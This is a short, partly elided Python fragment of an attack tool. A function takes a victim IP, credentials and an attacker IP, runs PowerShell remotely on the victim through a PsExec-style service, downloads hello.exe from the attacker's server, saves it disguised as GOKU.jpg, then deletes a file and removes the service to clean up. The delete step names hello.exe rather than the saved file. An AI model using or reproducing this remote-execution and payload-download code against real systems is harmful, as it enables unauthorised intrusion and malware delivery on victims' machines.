...
def psexe(victim_ip,username,password,attacker_ip):
    ...
    try:
        ...
        stdout, stderr, rc = c.run_executable("powershell.exe",arguments="Invoke-WebRequest http://"+attacker_ip+":8000/hello.exe -o C:\\Users\\"+username+"\\GOKU.jpg")
        ...
        stdout, stderr, rc = c.run_executable("del C:\\Users\\"+username+"\\hello.exe", use_system_account=True)
    finally:
        c.remove_service()
        c.disconnect()
        return status 
